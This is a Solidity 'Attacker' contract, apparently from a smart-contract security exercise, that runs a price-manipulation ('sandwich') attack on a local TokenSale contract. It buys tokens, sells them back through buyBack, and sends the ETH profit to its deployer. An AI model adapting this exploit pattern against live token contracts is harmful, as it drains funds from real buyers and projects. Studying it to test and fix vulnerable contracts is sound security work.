// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../src/TokenSale.sol";

/// @title Sandwich attack contract on TokenSale contract
/// @author Mehdi R.
/// @notice Sandwich attack when buying tokens

contract Attacker {
    TokenSale public tokenSale;
    address public attacker;

    constructor(TokenSale _tokenSale) {
        tokenSale = TokenSale(_tokenSale);
        attacker = msg.sender;
    }

    // To receive ETH when calling buyBack
    receive() external payable {}

    function attack(uint256 buyAmount, uint256 sellAmount) public payable {
        uint256 initialPrice = tokenSale.calculatePrice();
        uint256 cost = initialPrice * buyAmount;
        require(msg.value >= cost, "Not enough ETH");

        // Buy tokens
        tokenSale.buyToken{value: msg.value}(buyAmount);

        // Now the Price of tokens is higher
        uint256 sellBackPrice = initialPrice + (buyAmount * 0.1 ether);
        require(sellBackPrice > cost);  // check if we are making profits by selling back
        tokenSale.buyBack(sellAmount, 4000000);

        // Calculate the profit
        uint256 profit = address(this).balance - msg.value;

        // Send the profit back to the attacker
        payable(attacker).transfer(profit);
    }
}
